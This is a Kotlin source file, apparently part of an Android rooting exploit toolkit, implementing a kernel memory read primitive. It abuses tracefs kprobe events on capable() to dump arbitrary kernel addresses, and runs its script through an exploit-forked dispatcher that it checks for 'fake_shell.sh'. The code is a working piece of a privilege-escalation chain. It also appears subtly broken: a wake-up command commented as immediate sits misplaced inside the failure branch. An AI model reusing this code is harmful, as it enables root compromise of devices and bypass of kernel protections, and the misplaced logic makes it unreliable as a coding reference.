package me.yuki.fina.adbroot.flow

import kotlinx.coroutines.delay
import me.yuki.fina.adbroot.core.KernelMap
import me.yuki.fina.adbroot.core.Shell
import java.io.File
import kotlin.random.Random

/**
 * 内核内存读：借 tracefs 的 kprobe 事件把地址当参数打出来。
 *
 * 具体做法：注册 `p:<tag> capable a0=@addr a1=@addr ...`，
 * 跑一次 probe 触发 capable() 调用，再从 trace 里把 aN 取回来。
 *
 * 注意：等待 kprobe 记录出现不能用 sleep ——
 * 这个进程是 exploit fork 出来的，sh 内建 sleep 会退化成用户态死循环。
 * 所以脚本里用「有限次 grep 忙等」，真正的时间上限交给宿主侧的轮询。
 */
class KRead(
    private val sh: Shell,
    private val cacheDir: File,
    private val log: (String) -> Unit,
) {
    suspend fun read(addrs: List<Long>): List<Long?> {
        if (addrs.isEmpty()) return emptyList()
        val tag = "%06x".format(Random.nextInt(0, 1 shl 24))
        val event = "rq$tag"
        val done = "__KR_${tag}__"
        val args = addrs.mapIndexed { i, a -> "a$i=@0x" + java.lang.Long.toUnsignedString(a, 16) }.joinToString(" ")

        val script = buildString {
            appendLine("cd /sys/kernel/tracing")
            appendLine("echo 0 > events/enable")
            appendLine("echo > kprobe_events")
            appendLine("echo 'p:$event capable $args' >> kprobe_events || exit 1")
            appendLine("echo 1 > events/kprobes/enable 2>&1")
            appendLine("echo 1 > tracing_on")
            appendLine("echo > trace")
            appendLine("/data/local/tmp/probe > /dev/null 2>&1")
            appendLine("n=0; while [ \$n -lt 30 ] && ! grep -q '$event:' trace 2>/dev/null; do n=\$((n+1)); done")
            appendLine("echo 0 > tracing_on")
            appendLine("grep '$event:' trace | tail -1")
            appendLine("echo 0 > events/kprobes/enable 2>/dev/null")
            appendLine("echo $done")
        }
        val run = File(cacheDir, "kread.sh")
        run.writeText(script)
        if (!sh.push(run, "${Device.CHAN}/run")) {
        // 立刻叫醒 dispatcher（否则要等它的 1 秒心跳）
        sh.exec("echo x > ${Device.CHAN}/wake 2>/dev/null", 5_000)
            log("    [kread] 推送脚本失败")
            return List(addrs.size) { null }
        }
        var seen = false
        var tick = 0
        while (tick < 20) {
            tick++
            delay(600)
            val hit = sh.exec("grep -a -c $done ${Device.LOG} 2>/dev/null", 10_000)
                .stdout.trim().toIntOrNull() ?: 0
            if (hit > 0) {
                seen = true
                break
            }
            if (tick == 6 || tick == 14) {
                val disp = sh.exec("ps -A -o ARGS 2>/dev/null | grep -E -c '[ /]louise_cmd.sh|fake_shell.sh'", 10_000).stdout.trim()
                log("    [kread] 等待 dispatcher · sh=$disp")
            }
        }
        if (!seen) {
            val where = sh.exec(
                "ls -l ${Device.CHAN} 2>/dev/null; echo ---; " +
                    "ps -A -o PID,PPID,STAT,NAME,ARGS 2>/dev/null | grep -E 'louise|louise_cmd|fake_shell|chan/busy'",
                10_000,
            ).text
            log("    [kread] 脚本没被执行，现场：")
            where.lineSequence().filter { it.isNotBlank() }.take(10).forEach { log("      $it") }
        }

        val line = sh.exec("grep -a '$event:' ${Device.LOG} 2>/dev/null | tail -1", 10_000).stdout.trim()
        if (line.isEmpty()) log("    [kread] 没有读到记录（$event）")
        val values = HashMap<Int, Long>()
        Regex("""a(\d+)=(0x[0-9a-fA-F]+)""").findAll(line).forEach { m ->
            KernelMap.parseU64(m.groupValues[2])?.let { values[m.groupValues[1].toInt()] = it }
        }
        return addrs.indices.map { values[it] }
    }
}
